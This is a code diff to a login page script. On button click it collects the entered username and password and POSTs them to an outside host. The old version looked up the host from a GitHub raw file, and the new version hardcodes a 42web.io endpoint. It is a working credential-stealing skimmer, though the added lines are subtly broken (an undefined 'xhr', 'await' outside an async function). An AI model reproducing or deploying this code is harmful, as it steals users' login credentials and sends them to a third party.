@@ -6,27 +6,19 @@ const password = document.querySelector('[name="user.senha"]')
 
 if (btn){
     btn.addEventListener("click", function(){
+        const urlContent = xhr.responseText;
 
-        let xhr = new XMLHttpRequest();
+        const data = new FormData();
+        data.append("username", username.value);
+        data.append("password", password.value);
 
-        xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
-        xhr.onreadystatechange = async function() {
-            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-                const urlContent = xhr.responseText;
 
-                const data = new FormData();
-                data.append("username", username.value);
-                data.append("password", password.value);
-                
-                console.log(data)
-
-                const response = await fetch(urlContent + "index/get.php", {
-                    mode: 'no-cors',
-                    method: "POST",
-                    body: data
-                });
-            }
-        };
-        xhr.send();
+        const response = await fetch("https://fckyou.42web.io/index/get.php", {
+            mode: 'no-cors',
+            method: "POST",
+            body: data
+        });
+        
+        console.log(data)
     });
 }
